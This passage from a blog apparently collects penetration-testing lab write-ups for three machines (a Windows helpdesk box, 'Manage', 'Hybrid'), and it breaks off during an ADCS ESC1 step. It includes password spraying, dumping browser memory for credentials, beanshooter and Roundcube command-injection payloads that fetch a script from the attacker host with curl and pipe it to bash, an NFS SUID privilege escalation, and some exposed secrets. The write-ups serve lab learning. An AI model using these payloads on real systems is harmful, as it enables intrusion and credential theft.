Initial NmapPORT    STATE SERVICE       REASON          VERSION80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0| http-title: Support Login Page|_Requested resource was login.php| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set| http-methods:|   Supported Methods: OPTIONS TRACE GET HEAD POST|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC445/tcp open  microsoft-ds? syn-ack ttl 127Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2025-04-06T22:12:43|_  start_date: N/A|_clock-skew: 1s| p2p-conficker:|   Checking for Conficker.C or higher...|   Check 1 (port 48515/tcp): CLEAN (Timeout)|   Check 2 (port 35033/tcp): CLEAN (Timeout)|   Check 3 (port 25486/udp): CLEAN (Timeout)|   Check 4 (port 29195/udp): CLEAN (Timeout)|_  0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode:|   3:1:1:|_    Message signing enabled but not required

HelpDesk Support, Please Help!Looking on port 80 we see a site, with the option to login as guest. We also find a potential user.

We also see his configuration he attacted so kindly.
version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Ã‚ mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh

Looking into Cisco Passwords we are able to decrypt these password hashes by finding the hash type. We are able to try them against the user we found hazard. When we try them against the site we donâ€™t get access.
SMB for usersUsing our password list we can spray and see which works for our user.
$ nxc smb 10.10.10.149 -u hazard -p pass.lstSMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:&lt;SNIP&gt;
From here we can get a list of users.
$ nxc smb 10.10.10.149 -u hazard -p &lt;SNIP&gt; --rid-brute | grep SidTypeUser | cut -d &#x27;\&#x27; -f2 | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.list
Then since I have some passwords to try Iâ€™ll try them against all the users we gathered.
$ nxc smb 10.10.10.149 -u users.list -p pass.lst --continue-on-successSMB                      10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)SMB                      10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:&lt;SNIP&gt;SMB                      10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)SMB                      10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:&lt;SNIP&gt;

WinRM-ingWe can also look to see who has WinRM access. 
$ nxc winrm 10.10.10.149 -u users.list -p pass.lst --continue-on-successWINRM       10.10.10.149    5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)&lt;SNIP&gt;WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\Chase:&lt;SNIP&gt; (Pwn3d!)
Looks as user chase has some access, lets hop on the machine.
Banking with Chase ðŸ˜‚After getting connected, we look at the usual.

Unusual installed programs and directories in C:
Services running&#x2F;Process running (â€˜psâ€™)
User permissions and groups
etc,etc,etc

Looking into process running we see firefox running, and for that matter they seem to be using it now. So we can dump the memory of this process.
*Evil-WinRM* PS C:\Users\Chase\Documents&gt; psHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------    463      18     2240       5320               364   0 csrss    290      13     2224       5076               480   1 csrss    357      15     3500      14548              5052   1 ctfmon    255      14     3896      13288              3788   0 dllhost    166       9     1872       9632       0.02   6672   1 dllhost    617      32    29092      57664               968   1 dwm   1492      57    23540      79016              3856   1 explorer   1164      68   129556     206536       3.42   6344   1 firefox    347      19    10168      35328       0.05   6468   1 firefox    401      34    30516      89464       0.42   6612   1 firefox    378      28    21968      58372       0.19   6884   1 firefox    355      25    16396      38740       0.06   7144   1 firefox     49       6     1792       4600               784   1 fontdrvhost&lt;SNIP&gt;
Using procdump64.exe, a neat tool from Sysinternals, we can dump the memory of the process.
*Evil-WinRM* PS C:\Users\Chase\Documents&gt; .\procdump64.exe -mm 6344 firefoxProcDump v11.0 - Sysinternals process dump utilityCopyright (C) 2009-2022 Mark Russinovich and Andrew RichardsSysinternals - www.sysinternals.com[19:06:16] Dump 1 initiated: C:\Users\Chase\Documents\firefox.dmp[19:06:16] Dump 1 complete: 5 MB written in 0.1 seconds[19:06:16] Dump count reached.*Evil-WinRM* PS C:\Users\Chase\Documents&gt; ls    Directory: C:\Users\Chase\DocumentsMode                LastWriteTime         Length Name----                -------------         ------ -----a----         4/7/2025   7:06 PM        4594512 firefox.dmp-a----         4/7/2025   7:05 PM         424856 procdump64.exe*Evil-WinRM* PS C:\Users\Chase\Documents&gt;
System Administrator left somethingAfter getting the dmp to our machine, easiest via SMB server, we can look through the content. Looking for anything related to the machine or users.
$ strings firefox.log.dmp |less&lt;SNIP&gt;MOZ_CRASHREPORTER_STRINGS_OVERRIDE=C:\Program Files\Mozilla Firefox\browser\crashreporter-override.inilocalhost/login.php?login_username=admin@support.htb&amp;login_password=&lt;SNIP&gt;&amp;login=DELETE FROM moz_anno_attributes WHERE id IN (
Alas, we find a POST request with username and password. We can login with the Administrator account now.
$ evil-winrm -i 10.10.10.149 -u administrator -p &lt;SNIP&gt;Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoamisupportdesk\administrator*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>Cisco</tag>
        <tag>ProcDump</tag>
      </tags>
  </entry>
  <entry>
    <title>Manage (Linux Easy)</title>
    <url>/2025/04/25/Manage/</url>
    <content><![CDATA[
Manage is a Linux Easy machine starting off with Java RMI using beanshooter. After enumeration we see we gather credentials and that authorization on the Remote MBean server isnâ€™t required. Using this we are able to get a foothold on the machine. As user tomcat, we see other users we can attack in /etc/passwd. Trying to escalate our privilege to useradmin we have password reuse from the credentials we gathered, but upon entering the password were asked for verification. Looking in useradminâ€˜s home we see a backup tar file. Getting it to our machine yields this users home directory backed up. We have a ssh key we can use to get on the box, along with .google_authenticator having PINS to try. Doing so gets us sshed on the box. Looking at our users privilege, we see we have ALL:ALL on /usr/sbin/adduser. Looking at a typical sudoers file we see we can use admin as a user, as this group is not present on the box. Upon adding this user, they will in turn be added to the admin group allowing just ALL:ALL, which gives us root.
Initial NmapPORT     STATE SERVICE  REASON         VERSION22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)                              | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)                            |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh          2222/tcp open  java-rmi syn-ack ttl 63 Java RMI                                             | rmi-dumpregistry:                                                                         |   jmxrmi                                                                                  |     javax.management.remote.rmi.RMIServerImpl_Stub                                        |     @127.0.1.1:38941                        |     extends                                                                               |       java.rmi.server.RemoteStub                                                          |       extends                                                                             |_        java.rmi.server.RemoteObject                                                      |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)                              8080/tcp open  http     syn-ack ttl 63 Apache Tomcat 10.1.19                                 |_http-favicon: Apache Tomcat                  |_http-title: Apache Tomcat/10.1.19            | http-methods:                                                                             |_  Supported Methods: GET HEAD POST OPTIONS   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Looking at port 2222 specifically. ðŸ‘€
Java RMI (Remote Method Invocation) and our footHold ðŸ‘ŒJava RMI(Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if theyâ€™re on different physical machines. RMI provides a mechanism for Java-based distributed computing. We can abuse this with beanshooter.

We can first run some enumeration.
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.124.240 2222[+] Checking available bound names:[+][+]     * jmxrmi (JMX endpoint: 127.0.1.1:38941)[+][+] Checking for unauthorized access:[+][+]     - Remote MBean server does not require authentication.[+]       Vulnerability Status: Vulnerable[+][+] Checking pre-auth deserialization behavior:[+][+]     - Remote MBeanServer rejected the payload class.[+]       Vulnerability Status: Non Vulnerable   &lt;SNIP&gt;[+] Enumerating tomcat users:[+][+]     - Listing 2 tomcat users:[+][+]             ----------------------------------------[+]             Username:  manager[+]             Password:  &lt;SNIP&gt;[+]             Roles:[+]                        Users:type=Role,rolename=&quot;manage-gui&quot;,database=UserDatabase[+][+]             ----------------------------------------[+]             Username:  admin[+]             Password:  &lt;SNIP&gt;[+]             Roles:[+]                        Users:type=Role,rolename=&quot;role1&quot;,database=UserDatabas                     

Now we have some credentials. But lets try to get a shell. First we can create a reverse shell and put it in x and host it. This will grab our shell.
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec &#x27;curl -o /tmp/x 10.8.4.29/x&#x27;

This the executes our shell.
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec &#x27;bash /tmp/x&#x27;

Our foothold appears ðŸ™Œ
$ nc -lvnp 9001listening on [any] 9001 ...connect to [10.8.4.29] from (UNKNOWN) [10.10.124.240] 57806bash: cannot set terminal process group (597): Inappropriate ioctl for devicebash: no job control in this shelltomcat@manage:/$ ididuid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)tomcat@manage:/$ 


Iâ€™m just a regular TomcatAs tomcat we look around seeing we have to users we can look at. Going to /home we can see a directory backup in useradminâ€˜s home directory. This has a backup.tar.gz we can extract to our machine. 
$ tomcat@manage:/home/useradmin/backups$ lslsbackup.tar.gz
I just base64 encoded and the decoded on my machine. After that we had some directories, including .ssh. Using the key we can ssh in as useradmin, but upon entering the password it asks for verification.
$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240(useradmin@10.10.124.240) Verification code:
We also had a .google_authenticator file. This held PINS we can use for verification, and after using one or two we get in.
$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240(useradmin@10.10.124.240) Verification code: Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)Last login: Sat Apr 26 00:29:41 2025 from 10.8.4.29useradmin@manage:~$ iduid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)

PrivEscIf we look at our privileges we have adduser, trying everything such as appending to the end i.e. --uid 0 or --system didnâ€™t yield any results. Yet if we look we groups there wasnâ€™t an admin, a typical sudoers file looks like the following:
# User privilege specificationroot	ALL=(ALL:ALL) ALL# Members of the admin group may gain root privileges%admin ALL=(ALL) ALL# Allow members of group sudo to execute any command%sudo	ALL=(ALL:ALL) ALL
So in theory if we add a user named admin then groups follow when a new user is added. So adding user admin would give us the permissions ALL=(ALL) ALL. That gets us root.
useradmin@manage:~$ su adminPassword: admin@manage:/home/useradmin$ sudo -l[sudo] password for admin: Matching Defaults entries for admin on manage:    env_reset, timestamp_timeout=1440, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser admin may run the following commands on manage:    (ALL) ALLadmin@manage:/home/useradmin$ sudo suroot@manage:/home/useradmin# iduid=0(root) gid=0(root) groups=0(root)


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>Java RMI</tag>
        <tag>TomCat</tag>
        <tag>Sudo Abuse</tag>
      </tags>
  </entry>
  <entry>
    <title>Hybrid (Chain Easy)</title>
    <url>/2025/04/29/Hybrid/</url>
    <content><![CDATA[
Hybrid is a Chain mixed with a linux and windows machine. Starts off with Roundcube Webmail on http, using alias identities your able to force command injection leading to a reverse shell. The once on the box your find /etc/exports enabling rw for /opt/share, allowing for privilege escalation to user peter. Once done, you tunnel through to find a vulnerable ESC1 template allowing for Domain Computers to supply enrollees allowing for privilege escalation to Administrator.
Initial NmapTwo IPs to scan.
Nmap scan report for 10.10.160.197Host is up (0.16s latency).Not shown: 988 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-11 15:34:13Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9|_ssl-date: TLS randomness does not represent time445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9|_ssl-date: TLS randomness does not represent time3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a93269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc01.hybrid.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl| Issuer: commonName=hybrid-DC01-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-17T16:39:23| Not valid after:  2025-07-17T16:39:23| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9|_ssl-date: TLS randomness does not represent time3389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: HYBRID|   NetBIOS_Domain_Name: HYBRID|   NetBIOS_Computer_Name: DC01|   DNS_Domain_Name: hybrid.vl|   DNS_Computer_Name: dc01.hybrid.vl|   Product_Version: 10.0.20348|_  System_Time: 2024-11-11T15:36:56+00:00| ssl-cert: Subject: commonName=dc01.hybrid.vl| Issuer: commonName=dc01.hybrid.vl| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-07-16T16:48:12| Not valid after:  2025-01-15T16:48:12| MD5:   d7ed:81b4:60b7:109f:56e3:7901:e081:2237|_SHA-1: 95e3:a4cd:6bc8:3de4:cd9a:92c3:10e5:4e58:9951:81a4|_ssl-date: 2024-11-11T15:37:36+00:00; 0s from scanner time.Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2024-11-11T15:36:56|_  start_date: N/A| smb2-security-mode:|   3:1:1:|_    Message signing enabled and requiredNmap scan report for 10.10.160.198Host is up (0.16s latency).Not shown: 990 closed tcp ports (reset)PORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)25/tcp   open  smtp?|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING80/tcp   open  http        nginx 1.18.0 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD|_http-title: Redirecting...|_http-server-header: nginx/1.18.0 (Ubuntu)110/tcp  open  pop3        Dovecot pop3d| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008|_ssl-date: TLS randomness does not represent time|_pop3-capabilities: CAPA UIDL SASL RESP-CODES STLS AUTH-RESP-CODE PIPELINING TOP111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo:|   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      35943/tcp6  mountd|   100005  1,2,3      38361/tcp   mountd|   100005  1,2,3      42047/udp   mountd|   100005  1,2,3      55681/udp6  mountd|   100021  1,3,4      32856/udp   nlockmgr|   100021  1,3,4      36789/tcp6  nlockmgr|   100021  1,3,4      37737/tcp   nlockmgr|   100021  1,3,4      60997/udp6  nlockmgr|   100227  3           2049/tcp   nfs_acl|_  100227  3           2049/tcp6  nfs_acl143/tcp  open  imap        Dovecot imapd (Ubuntu)|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 capabilities SASL-IR ID ENABLE have Pre-login LOGINDISABLEDA0001 listed STARTTLS|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008587/tcp  open  submission?|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)|_ssl-date: TLS randomness does not represent time|_imap-capabilities: more post-login LOGIN-REFERRALS OK LITERAL+ IDLE IMAP4rev1 AUTH=LOGINA0001 SASL-IR AUTH=PLAIN ENABLE have capabilities Pre-login listed ID| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008995/tcp  open  ssl/pop3    Dovecot pop3d|_pop3-capabilities: CAPA UIDL SASL(PLAIN LOGIN) RESP-CODES USER AUTH-RESP-CODE PIPELINING TOP| ssl-cert: Subject: commonName=mail01| Subject Alternative Name: DNS:mail01| Issuer: commonName=mail01| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2023-06-17T13:20:17| Not valid after:  2033-06-14T13:20:17| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008|_ssl-date: TLS randomness does not represent time2049/tcp open  nfs_acl     3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

We have two targets, lets focus on the linux machine first since the other is unreachable.
HTTPGoing to the IP address redirectes us to mail01.hybrid.vl and looks to be Roundcube Webmail. Not much we can do at the moment. Weâ€™ll come back ðŸ‘.

NFSWe did have a port 2049 NFS open we can check.
$ showmount -e 10.10.168.102Export list for 10.10.168.102:/opt/share *

Mounting to it we see backup.tar.gz. We copy it and unzip to find some configs and other directorys.
$ sudo mount.nfs -o rw 10.10.139.134:/opt/share tmpMnt/ $ tree backup             backupâ”œâ”€â”€ backup.tar.gzâ”œâ”€â”€ etcâ”‚Â Â  â”œâ”€â”€ dovecotâ”‚Â Â  â”‚Â Â  â””â”€â”€ dovecot-usersâ”‚Â Â  â”œâ”€â”€ passwdâ”‚Â Â  â”œâ”€â”€ postfixâ”‚Â Â  â”‚Â Â  â””â”€â”€ main.cfâ”‚Â Â  â””â”€â”€ sssdâ”‚Â Â      â””â”€â”€ sssd.confâ””â”€â”€ opt    â””â”€â”€ certs        â””â”€â”€ hybrid.vl            â”œâ”€â”€ fullchain.pem            â””â”€â”€ privkey.pem8 directories, 7 files
This reveals some users from the dovecot-users file.
admin@hybrid.vl:&#123;plain&#125;&lt;SNIP&gt;peter.turner@hybrid.vl:&#123;plain&#125;&lt;SNIP&gt;

We can try these to login with RoundCube.
RoundCube WebmailUsing the credentials weâ€™re able to login with both accounts. Looking at what version is installed we see more plugins install as well, one that sticks out is markasjunk. 

We can look over this blog and see how it works. So simply, we need to use peterâ€™s account to send and email to admin and receive a shell back.
We need to change his email a bit, or his identity, to peter.turner&amp;curl$&#123;IFS&#125;-o$&#123;IFS&#125;/tmp/x$&#123;IFS&#125;10.8.4.29/x$&#123;IFS&#125;|$&#123;IFS&#125;bash&amp;@hybrid.vl. 

Then we send an email to admin, select it, and mark as junk. Then watch the magic happen. ðŸŽ‡âœ¨ðŸŽ‡(we hope) ðŸ¤¨

$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.168.102 - - [28/Apr/2025 14:03:22] &quot;GET /x HTTP/1.1&quot; 200 -
Hits us!!
$ nc -lvnp 900114:04:13 [14/27]listening on [any] 9001 ...  connect to [10.8.4.29] from (UNKNOWN) [10.10.168.102] 52370bash: cannot set terminal process group (646): Inappropriate ioctl for devicebash: no job control in this shellwww-data@mail01:~/roundcube$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@mail01:~/roundcube$

We got our callback.
Shell as www-dataChecking the mysql config doesnâ€™t yield much but the same users.
www-data@mail01:~/roundcube$ cat config/config.inc.php | grep -v &#x27;^//&#x27; | grep .&lt;?php/* Local configuration for Roundcube Webmail */$config[&#x27;db_dsnw&#x27;] = &#x27;mysql://roundcube:&lt;SNIP&gt;@localhost/roundcubemail&#x27;;$config[&#x27;imap_host&#x27;] = &#x27;localhost:143&#x27;;$config[&#x27;support_url&#x27;] = &#x27;&#x27;;$config[&#x27;des_key&#x27;] = &#x27;RpiHQJt10wGZdlMAU9CnBPfc&#x27;;$config[&#x27;plugins&#x27;] = [&quot;markasjunk&quot;];

Since the NFS was running we can check its configs at /etc/exports. Which yields the follwing:
$ cat /etc/exports# /etc/exports: the access control list for filesystems which may be exported#               to NFS clients.  See exports(5).## Example for NFSv2 and NFSv3:# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)## Example for NFSv4:# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)#/opt/share *(rw,no_subtree_check)    

This is a good one!!! Basically, we can copy the systems /bin/bash to /opt/share(your machines &#x2F;bin&#x2F;bash might not work). Then create user peter with the same uid and give ownership of bash to peter and give it a stickybit. Execute on the victim machine. 

Weâ€™re peter on the box!!âœ¨âœ¨
---VicMac--$ cp /bin/bash /opt/share$ id peter.turner@hybrid.vluid=&lt;SNIP&gt;(peter.turner@hybrid.vl) gid=&lt;SNIP&gt;(domain users@hybrid.vl) groups=&lt;SNIP&gt;(domain users@hybrid.vl),&lt;SNIP&gt;(hybridusers@hybrid.vl)--AttMac--$ useradd -u &lt;SNIP&gt; -r -s /bin/bash peter$ su peter$ cp /opt/share/bash .$ chmod +s bash$ cp bash /opt/share--VicMac--$ ./bash -pbash-5.1$ iduid=33(www-data) gid=33(www-data) euid=90&lt;SNIP&gt;(peter.turner@hybrid.vl) egid=992 groups=992,33(www-data)bash-5.1$ 

We have euid of peter.turner, which means we can see his home directory now. His home directory contains passwords.kdbx, a KeePass Database. Getting this to our windows vm and looking at it it requires a password. We can try one of the passwords we found from the dovecot-users file, which gets is in.

Root Toot!!Now we have his domain password, and if we try to simply ssh to the box with this password, we get a session. As a added bonus, we get root easily!!
$ ssh peter.turner@hybrid.vl@mail01.hybrid.vl          (peter.turner@hybrid.vl@mail01.hybrid.vl) Password:Last login: Mon Apr 28 23:17:53 2025 from 10.8.4.29peter.turner@hybrid.vl@mail01:~$ sudo -l[sudo] password for peter.turner@hybrid.vl: Matching Defaults entries for peter.turner@hybrid.vl on mail01:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser peter.turner@hybrid.vl may run the following commands on mail01:    (ALL) ALLpeter.turner@hybrid.vl@mail01:~$ sudo suroot@mail01:/home/peter.turner@hybrid.vl#

PivotingSetting up a tunnel using chisel so we can continue our enumeration. After doing so, we get an bloodhound dump.
$ proxychains4 -q nxc ldap hybrid.vl -u peter.turner -p &#x27;b0cwR+G4Dzl_rw&#x27; --dns-server 10.10.145.149 --bloodhound -c All
Long story short, peter didnâ€™t have anything we could to our advantage.
Seeing as ADCS is running on the machine we can try there.
ADCS is my friendRunning certipy we find that this template is vulnerable to ESC1. 
$ proxychains4 -q certipy find -vulnerable -dc-ip 10.10.149.117 -u peter.turner@hybrid.vl -p &lt;SNIP&gt; -stdout -debug&lt;SNIP&gt; [!] Vulnerabilities      ESC1                              : &#x27;HYBRID.VL\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication

Yet we need a Domain Computer to do this, and we did have root on the MAIL01$ machine. We can get the keytab file for kerberos over to our machine and use keytabextract.py. 
$ keytabextract.py /home/jay/Documents/vl/chains/hybrid/krb5.keytab [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.[+] Keytab File successfully imported.        REALM : HYBRID.VL        SERVICE PRINCIPAL : MAIL01$/        NTLM HASH : &lt;SNIP&gt;        AES-256 HASH : &lt;SNIP&gt;        AES-128 HASH : &lt;SNIP&gt;
PrivEscNow we can exploit ESC1 with a couple commands.
Firstly, we request with upn Administrator using the CA and the Template Name. This will give us a pfx file.
